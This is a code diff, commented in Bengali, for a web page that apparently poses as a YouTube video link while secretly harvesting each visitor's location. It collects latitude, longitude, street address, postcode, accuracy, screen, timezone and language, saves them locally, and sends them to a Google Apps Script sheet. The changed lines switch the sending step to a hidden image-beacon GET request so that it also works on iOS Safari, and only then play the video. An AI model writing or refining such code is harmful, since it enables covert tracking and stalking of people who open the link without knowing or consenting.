@@ -280,7 +280,7 @@
 
   // Google Sheets Web App URL (নিচের ধাপে set করুন)
   // এটা সেট করলে সব device থেকে location আপনার Sheet-এ যাবে
-  const GOOGLE_SHEET_URL = "https://script.google.com/macros/s/AKfycbzH9ngQT6Zm0ElYAl8vnbf0Dh1NgQJllkB20NReeb8t5FSYHg1tvdPldpALEKJP2dNd/exec";
+  const GOOGLE_SHEET_URL = "https://script.google.com/macros/s/AKfycbw5519PIQvix6PhBg8B9cBoyfkv28JTvgt9bvt8shAWBcVI4tdFOs5bnavlB8uAMwo0/exec";
 
   // =====================================================
 
@@ -338,26 +338,37 @@
   }
 
   function saveAndPlay(data) {
-    // LocalStorage-এ save (same-origin dashboard পড়বে)
+    // LocalStorage-এ save
     try {
       var existing = JSON.parse(localStorage.getItem("yt_track_data") || "[]");
       existing.unshift(data);
       localStorage.setItem("yt_track_data", JSON.stringify(existing));
     } catch(e) {}
 
-    // Google Sheets-এ পাঠানো (যদি URL set থাকে)
+    // Google Sheets-এ GET request দিয়ে পাঠানো (iOS Safari compatible)
     if (GOOGLE_SHEET_URL) {
-      fetch(GOOGLE_SHEET_URL + "?callback=cb", {
-        method: "POST",
-        mode: "no-cors",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(data)
-      }).catch(function() {});
+      var params = "?lat=" + encodeURIComponent(data.lat || "")
+        + "&lon=" + encodeURIComponent(data.lon || "")
+        + "&city=" + encodeURIComponent(data.city || "")
+        + "&district=" + encodeURIComponent(data.district || "")
+        + "&country=" + encodeURIComponent(data.country || "")
+        + "&postcode=" + encodeURIComponent(data.postcode || "")
+        + "&accuracy=" + encodeURIComponent(data.accuracy_meters || "")
+        + "&address=" + encodeURIComponent((data.full_address || "").substring(0, 200))
+        + "&platform=" + encodeURIComponent(data.platform || "")
+        + "&screen=" + encodeURIComponent(data.screenSize || "")
+        + "&timezone=" + encodeURIComponent(data.timezone || "")
+        + "&language=" + encodeURIComponent(data.language || "")
+        + "&timestamp=" + encodeURIComponent(data.timestamp || "");
+
+      var img = new Image();
+      img.src = GOOGLE_SHEET_URL + params;
     }
 
     showToast();
     playVideo();
   }
+
 
 
   function showToast() {
